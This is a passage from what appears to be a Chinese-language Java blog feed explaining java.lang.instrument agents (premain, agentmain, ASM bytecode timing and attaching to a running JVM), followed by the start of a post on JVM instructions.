class="string">"&gt;&gt;&gt; end Rand.run() &lt;&lt;&lt;"</span>);</span><br><span class="line"></span><br><span class="line">            System.out.println();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"&gt;&gt;&gt; start Main.sleep() &lt;&lt;&lt;"</span>);</span><br><span class="line">            Main.sleep();</span><br><span class="line">            System.out.println(<span class="string">"&gt;&gt;&gt; end MAin.sleep() &lt;&lt;&lt;"</span>);</span><br><span class="line"></span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> me.fangfeng.client;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Rand.java</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> fangfeng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2018/8/7</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Rand</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">double</span> rand = Math.random();</span><br><span class="line">            <span class="keyword">if</span> (rand &gt; <span class="number">0.995</span>) &#123;</span><br><span class="line">                System.out.println(String.format(<span class="string">"get random, values %f"</span>, rand));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着，来构造一个代理类，以及最重要的 <code>premain</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> me.fangfeng.javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Agent - 代理</span></span><br><span class="line"><span class="comment"> * 基于 JVM TI (JVM Tool Interface) 实现的 Java ClassFile 的增强</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> fangfeng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2018/8/7</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Agent</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// premain 将 JVM 初始化后，main(String... ) 执行前调用</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// new 一个转换器实例</span></span><br><span class="line">        ClassTimer transformer = <span class="keyword">new</span> ClassTimer();</span><br><span class="line">        instrumentation.addTransformer(transformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 之后的 agentmain(...) 将在这里提供，暂时隐去，避免对对读者产生干扰</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> me.fangfeng.javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.Opcodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> fangfeng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2018/8/7</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassTimer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="comment">// 这里涉及到了 ASM 的内容，主要目的是向每个方法块的开始及方法块的结束部分插入与计时器有关的代码</span></span><br><span class="line">        <span class="comment">// 如果想了解 ASM 的内容，请参阅 https://dormouse-none.github.io/2018-06-25-ASM-Core/  提供了一些基础性的内容，更多的请自行学习</span></span><br><span class="line">        <span class="comment">// 不了解具体内容将不影响对主体内容的理解</span></span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(classfileBuffer);</span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter(ClassWriter.COMPUTE_FRAMES);</span><br><span class="line">        MyClassWriter mcw = <span class="keyword">new</span> MyClassWriter(Opcodes.ASM6, cw);</span><br><span class="line">        cr.accept(mcw, ClassReader.EXPAND_FRAMES);</span><br><span class="line">        <span class="keyword">return</span> cw.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其它代码略，详见附件。</p><p>Java 这种对操作字节码的支持有个坑爹的地方，就是不得不打包成 Jar 来使用。</p><p>具体来看一下</p><p><code>me.fangfeng.javaagent</code> 包中包括 </p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fublsbbdw0j309o07g74u.jpg" alt=""></p><p>将被打包成 <code>agent.jar</code> 来使用</p><p>首先，来看一下需要打包在 <code>agent.jar</code> 的 <strong>MANIFEST.MF</strong> 的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Class-Path: /Users/fangfeng/.m2/repository/org/ow2/asm/asm/6.1.1/asm-6.1.1.jar</span><br><span class="line">Premain-Class: me.fangfeng.javaagent.Agent</span><br><span class="line">Can-Retransform-Classes: true</span><br></pre></td></tr></table></figure><p>再来个 SHELL 脚本，用来给打包这个 Jar</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译 me.fangfeng.javaagent 包下的类</span></span><br><span class="line">javac -cp .:/Users/fangfeng/.m2/repository/org/ow2/asm/asm/6.1.1/asm-6.1.1.jar me/fangfeng/javaagent/Agent.java me/fangfeng/javaagent/ClassTimer.java me/fangfeng/javaagent/MyClassWriter.java me/fangfeng/javaagent/MyMethodWriter.java me/fangfeng/javaagent/StaticTimer.java</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打包 me.fangfeng.javaagent 的 .class -&gt; agent.jar</span></span><br><span class="line">jar cvfm agent.jar MANIFEST-agent.MF me/fangfeng/javaagent/Agent.class me/fangfeng/javaagent/ClassTimer.class me/fangfeng/javaagent/MyClassWriter.class me/fangfeng/javaagent/MyMethodWriter.class me/fangfeng/javaagent/StaticTimer.class</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译 me.fangfeng.client 包下的类</span></span><br><span class="line">javac me/fangfeng/client/Main.java me/fangfeng/client/Rand.java</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以 me.fangfeng.client.Main 作为主类启动</span></span><br><span class="line">java -javaagent:agent.jar me.fangfeng.client.Main</span><br></pre></td></tr></table></figure><p>执行后，可以看到类似如下内容:</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fubmp354ejj30tq0rmtdp.jpg" alt=""></p><p>而直接用 <code>java me.fangfeng.client.Main</code> 的执行结果是:</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fubmqmj4uhj30j00f0dho.jpg" alt=""></p><p>从理论上来讲，<code>-javaagent:agent.jar</code> 配合 <code>agent.jar</code> 中的 MANIFEST.MF 文件，<br>使得 JVM 在初始化之后触发了被声明为 <code>Pre-Main</code> 的 me.fangfeng.javaagent.Agent 类的 premain(…) 方法。</p><p>并为 ClassLoader 在加载类的流程上增加了一层<strong>拦截器</strong> (这里是 ClassTimer.java 类，它实现了 <code>ClassFileTransformer</code> 接口</p><p>另外，<code>Can-Retransform-Classes: true</code> 的配置使得 ClassTimer 被允许对字节码进行重新转换。(而操作字节码是通过 ASM 来实现的)</p><h3 id="在运行中进行增强"><a href="#在运行中进行增强" class="headerlink" title="在运行中进行增强"></a>在运行中进行增强</h3><p>随着程序启动时直接使用了 <code>-javaagent</code> 选项。</p><p>那么是否存在在程序运行中进行额外代理操作的支持呢？当然是可以的。这里要借助 Java 提供的另一个类 com.sun.tools.attach.VirtualMachine 。</p><p>启动一个新的进程来连接到 正在运行中的进程，并令其加载 java agent。</p><p>基本的类与上一节的描述相同，主要是包 <code>me.fangfeng.javaagent.*</code> 和 <code>me.fangfeng.client.*</code></p><p>新增一个类 <code>me.fangfeng.javaagent.Main</code> 用来启动另一个进程，并要求运行中的 java 进程加载 agent.jar 来进行增强。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> me.fangfeng.javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AgentInitializationException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AgentLoadException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AttachNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> fangfeng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2018/8/7</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException </span>&#123;</span><br><span class="line">        VirtualMachine vm = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 通过 VirtualMachine 连接到 运行中的进程 (可以通过 jps 找到进程号)</span></span><br><span class="line">            vm = VirtualMachine.attach(&lt;PID&gt;);</span><br><span class="line">            vm.loadAgent(&lt;agent.jar 的路径&gt;);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (vm != <span class="keyword">null</span>) &#123;</span><br><span class="line">                vm.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Agent</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        ClassTimer transformer = <span class="keyword">new</span> ClassTimer();</span><br><span class="line">        instrumentation.addTransformer(transformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在在 Agent.java 上补上 agentmain(...) 的具体实现</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String args, Instrumentation instrumentation)</span> <span class="keyword">throws</span> UnmodifiableClassException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"SUCCESS AGENTMAIN"</span>);</span><br><span class="line">        ClassTimer transformer = <span class="keyword">new</span> ClassTimer();</span><br><span class="line">        <span class="comment">// add Transformer</span></span><br><span class="line">        instrumentation.addTransformer(transformer, <span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 对 Rand.class 进行重新转换</span></span><br><span class="line">        instrumentation.retransformClasses(Rand.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其它内容基本相同</p><p>首先需要先打包 agent.jar 。当然，如果是顺着本文的顺序进行本机实验，则 agent.jar 已经存在</p><p>先启动进程 <code>java me.fangfeng.client.Main</code></p><p>通过 <code>jps</code> 获取 Main 进程的 <strong>PID</strong></p><p>在 <code>java me.fangfeng.javaagent.Main</code> 中替换上进程号，并执行</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fuboclcelsj30tu152dlw.jpg" alt=""></p><p>从执行结果可以看到，原进程首先正常执行代码，等到被 load Agent 之后，字节码已经有了新的变化，从而导致输出结果动态的产生了变化。</p><p><em>当然，需要注意的是，执行中的进程被要求 load Agent 之后，运行中的 Class 将被改写，并始终如此，知道进程终止。再下一次重新启动</em></p><h2 id="BTrace"><a href="#BTrace" class="headerlink" title="BTrace"></a>BTrace</h2><p>以上描述的内容也可以理解为是 BTrace 实现的基础。毕竟，JVMTI (JVM Tool Interface) 原本的目的就是赋予使用者一个在运行中<br>查询系统各项数据的权利</p><p>当然，实现上，上述代码直接将各种增强(计时)硬编码到该进程中，同时统一使用了该进程的输入输出。</p><p>但是，BTrace 通过 Socket 将这些分离，检测代码通过 Socket 发回新的进程来维持输入输出。</p><p>在此，不再细说。</p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p>[1]. 示例代码: <a href="https://github.com/DorMOUSE-None/Repo/raw/master/instru.zip" target="_blank" rel="noopener">instru.zip</a><br>[2]. <a href="https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/Instrumentation.html" target="_blank" rel="noopener">java.lang.instrument.Instrumentation</a><br>[3]. <a href="https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html" target="_blank" rel="noopener">Package java.lang.instrument</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Start&quot;&gt;&lt;a href=&quot;#Start&quot; class=&quot;headerlink&quot; title=&quot;Start&quot;&gt;&lt;/a&gt;Start&lt;/h2&gt;&lt;p&gt;从现有的前置知识来说，我们能够认识到两个事实:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Java Class 通过 ClassLoader 进行加载。&lt;br&gt;通过&lt;code&gt;全限定名&lt;/code&gt;进行区分。当需要加载新的类时，ClassLoader 通过双亲委派机制判断是否已经加载过这个类。&lt;br&gt;换句话说: Class 一经加载，就不会尝试重复加载 (至少按绝大多数人的认知来说，确实是的)&lt;/li&gt;
&lt;li&gt;有没有可能让被加载的 Class 与物理存储上的 .class 内容不同。&lt;br&gt;当然也是完全可以做到的。不管怎么说，CGlib 和 Java Proxy 也是一个耳熟能详的概念吧&lt;br&gt;(虽然可能不了解细节。在此，欢迎学习前置技能 &lt;a href=&quot;https://dormouse-none.github.io/2018-07-10-CGlib-Enhancer/&quot;&gt;CGlib Enhancer 主流程源码解析&lt;/a&gt; 和 &lt;a href=&quot;https://dormouse-none.github.io/2018-07-20-Java-Proxy/&quot;&gt;Java Proxy 源码解析&lt;/a&gt;。不过不影响本文后续内容)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;另一个方面，也许绝大多数人都听说过所谓的&lt;code&gt;热部署&lt;/code&gt;。但是究竟怎么才能做到 &lt;code&gt;热部署&lt;/code&gt;(话题开得有点大哈。Y_Y 本文不讲这个)&lt;/p&gt;
&lt;p&gt;操作字节码一定是一个逃不开的话题，毕竟 Class 就是所谓的被加载到内存的字节码嘛。&lt;/p&gt;
&lt;p&gt;如何操作字节码? ASM, CGlib, Java Proxy, Javassist ? 不过这些都要等到需要被操作的类被加载了才行啊，似乎有点晚…&lt;/p&gt;
&lt;p&gt;Java 提供了一个可行的机制，用来在 ClassLoader 加载字节码之前完成对操作字节码的目的&lt;/p&gt;
&lt;h2 id=&quot;Instrumentation&quot;&gt;&lt;a href=&quot;#Instrumentation&quot; class=&quot;headerlink&quot; title=&quot;Instrumentation&quot;&gt;&lt;/a&gt;Instrumentation&lt;/h2&gt;&lt;p&gt;&lt;code&gt;java.lang.instrument.Instrumentation&lt;/code&gt; 类为提供直接操作 Java 字节码的又一个途径(虽然 Java Doc 的说明是用来检测 Java 代码的)&lt;/p&gt;
&lt;p&gt;相信我这个说明是没有问题的。毕竟完成对代码检测的途径是直接修改字节码。&lt;/p&gt;
&lt;p&gt;下列有两种方法可以达到目的&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;当 JVM 以指示一个代理类的方式启动时，将传递给代理类的 premain 方法一个 Instrumentation 实例。&lt;/li&gt;
&lt;li&gt;当 JVM 提供某种机制在 JVM 启动之后某一时刻启动代理时，将传递给代理代码的 agentmain 方法一个 Instrumentation 实例。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;话不多说，下面将全部以实例来展现对这种 JVM 检测机制(虽然例子已经脱离了&lt;em&gt;检测&lt;/em&gt;的目的)的使用&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://DorMOUSE-None.github.io/tags/Java/"/>
    
      <category term="ASM" scheme="https://DorMOUSE-None.github.io/tags/ASM/"/>
    
      <category term="BTrace" scheme="https://DorMOUSE-None.github.io/tags/BTrace/"/>
    
  </entry>
  
  <entry>
    <title>JVM 指令简析</title>
    <link href="https://DorMOUSE-None.github.io/2018-07-24-JVM-Instruction/"/>
    <id>https://DorMOUSE-None.github.io/2018-07-24-JVM-Instruction/</id>
    <published>2018-07-23T16:00:00.000Z</published>
    <updated>2018-07-24T01:08:24.556Z</updated>
    
    <content type="html"><![CDATA[<p>在之前描述过包括 ASM, CGlib, Java Proxy 的基本内容之后，本文将就更为基础的 JVM 指令集进行简单而有效的介绍。</p><p>当然，在开始正文前，读者需要了解到，JVM 指令集这种类似于汇编的规范性内容，包含一百多个指令，若要求一一介绍。<br>那么，直接阅读 <a href="https://docs.oracle.com/javase/specs/jvms/se8/html/index.html" target="_blank" rel="noopener">官方文档</a> 绝对是比本文的内容更为详实且准确。</p><p>这篇文档的目的，只是为了使读者建立起关于 JVM 指令集基本的常识性观念。</p><a id="more"></a><h2 id="术语约定"><a href="#术语约定" class="headerlink" title="术语约定"></a>术语约定</h2><p>首先，需要就 <code>术语</code> 进行一些基础性的约定:</p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1ftidi0xpmij30oa07kaaq.jpg" alt="变量"></p><ul><li><code>变量</code>: 在类中，区分于 <code>方法</code> 的声明<ul><li><code>成员变量</code>: 作用域为整个类，在方法体与语句块之外声明的内容。在 <code>字节码</code> 中通常被称为 <code>字段(Field)</code><ul><li><code>类成员变量 / 静态成员变量</code>: 被 <code>static</code> 修饰的 <code>成员变量</code>。一个类只有一份，在类被加载的时候即初始化。</li><li><code>实例成员变量</code>: 非 <code>static</code> 修饰的 <code>成员变量</code>。随着类被实例化而进行初始化，每个实例对象都有一份特有的 <code>实例变量</code>。</li></ul></li><li><code>局部变量</code>: 作用域为方法体或者语句块。</li></ul></li></ul><h3 id="JVM-指令"><a href="#JVM-指令" class="headerlink" title="JVM 指令"></a>JVM 指令</h3><p>通常，我们借助于 <code>javap</code> 命令来对 .class 文件的字节码内容进行查阅。</p><p>类似于汇编代码，<code>javap</code> 打印的JVM 指令将以下列格式进行展示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;index&gt; &lt;opcode&gt; [&lt;operand1&gt; [&lt;operand2&gt; ...]] [&lt;comment&gt;]</span><br></pre></td></tr></table></figure><p>其中 </p><ul><li><code>&lt;index&gt;</code> 指在 <code>code[]</code> 属性中这条指令的偏移量(从 0 开始计数)。</li><li><code>&lt;opcode&gt;</code> 指 <code>操作码</code></li><li><code>&lt;operandX&gt;</code> 指 <code>操作数</code>，每个 <code>&lt;opcode&gt;</code> 都需要确定数量的操作数(规范中已经确定)。</li><li><code>&lt;comment&gt;</code> 指注释</li></ul><h2 id="指令集概览"><a href="#指令集概览" class="headerlink" title="指令集概览"></a>指令集概览</h2><p>首先，Java 代码经编译后的所有指令都基于 <code>方法(Method)</code> 被定义在 <code>Code</code> 属性中。</p><p>在 <a href="https://docs.oracle.com/javase/specs/jvms/se8/html/jvms-4.html#jvms-4.7.3" target="_blank" rel="noopener">ClassFile</a> 的 <code>Code</code> 属性，结构定义如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Code_attribute &#123;</span><br><span class="line">    <span class="comment">// 其中 u1, u2, u4 分别表示这个变量所占的字节长度</span></span><br><span class="line">    u2 attribute_name_index;                    <span class="comment">// 属性名在常量池中的 index (执行常量池中 Code 的位置)</span></span><br><span class="line">    u4 attribute_length;                        <span class="comment">// 属性长度，不包括开始的六个字节</span></span><br><span class="line">    u2 max_stack;                               <span class="comment">// 运行时操作数栈的最大深度</span></span><br><span class="line">    u2 max_locals;                              <span class="comment">// 运行时所需的局部变量表的大小</span></span><br><span class="line">    u4 code_length;                             <span class="comment">// code 数组的长度</span></span><br><span class="line">    u1 code[code_length];                       <span class="comment">// code 数组，编译后方法体的内容都通过字节码指令存储在这里</span></span><br><span class="line">    u2 exception_table_length;                  <span class="comment">// 异常表的长度</span></span><br><span class="line">    &#123;   u2 start_pc;</span><br><span class="line">        u2 end_pc;</span><br><span class="line">        u2 handler_pc;</span><br><span class="line">        u2 catch_type;</span><br><span class="line">    &#125; exception_table[exception_table_length]; <span class="comment">// 异常表，Java 代码中所有的 catch, finally 的捕获都将由此表进行实现</span></span><br><span class="line">    u2 attributes_count;                       <span class="comment">// 属性计数</span></span><br><span class="line">    attribute_info attributes[attributes_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Java 虚拟机的指令是由一个字节长度的 <code>操作码</code> 配合上其后的 0 个或多个 <code>操作数</code> 所构成的。</p><p>其中，<code>操作数</code> 的数量取决于 <code>操作码</code>，不同的 <code>操作码</code> 需要不同数量的 <code>操作数</code>。</p><p>按照类型划分，<code>操作数</code> 主要包括下列几类:</p><ul><li>加载与存储指令，例如 iload, istore 等</li><li>运算指令，例如 iadd, isub, imul 等</li><li>类型转换指令，例如 i2b, i2s 等</li><li>对象创建与操作指令，例如 new, newarray 等</li><li>操作数栈管理指令，例如 dup, pop 等</li><li>控制转移指令，例如 if_icmpeq 等</li><li>方法调用与返回指令，例如 invokevirtual, invokestatic 等</li><li>抛出异常指令，例如 athrow 等</li><li>同步指令，例如 monitorenter 等</li></ul><p><strong>举几个简单的例子:</strong></p><p><code>iadd</code> 指令，表示对两个 int 数的相加指令。将从操作数栈顶依次取出两个数，并相加，再重新压入操作数栈中。</p><p><code>bipush 100</code> ，其中 <code>bipush</code> 是指令，后随一个操作数，表示把 <code>操作数 100 这个 byte 类型的数</code> 压入操作数栈顶</p><h2 id="运行时数据区"><a href="#运行时数据区" class="headerlink" title="运行时数据区"></a>运行时数据区</h2><p>JVM 定义了若干种运行期间会使用到的运行时数据区，见下图:</p><p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1ft5osi6it1j31kw0ql78e.jpg" alt="JVM 运行时数据区"></p><p>至于每一个的具体意义，在此不做详细展开，可用参考:</p><ul><li>由周志明等翻译的 《Java 虚拟机规范(Java SE 7版) 》 2.5节内容 <a href="http://icyfenix.iteye.com/blog/1256329" target="_blank" rel="noopener">链接</a></li><li><a href="https://docs.oracle.com/javase/specs/jvms/se8/html/jvms-2.html#jvms-2.5" target="_blank" rel="noopener">JVMS 2.5. Run-Time Data Areas</a></li></ul><h2 id="Getter-Setter-的指令代码"><a href="#Getter-Setter-的指令代码" class="headerlink" title="Getter, Setter 的指令代码"></a>Getter, Setter 的指令代码</h2><p>首先，有必要提及，想要得到 .class 可视且友好的展示结果，可以使用 JDK 自带的 <code>javap</code> 命令。</p><p>本节要展示的内容是常见的 POJO 的 get, set 方法的指令代码。使用的示例代码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> number;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getNumber</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNumber</span><span class="params">(<span class="keyword">int</span> number)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.number = number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在经过 <code>javac</code> 编译，<code>javap</code> 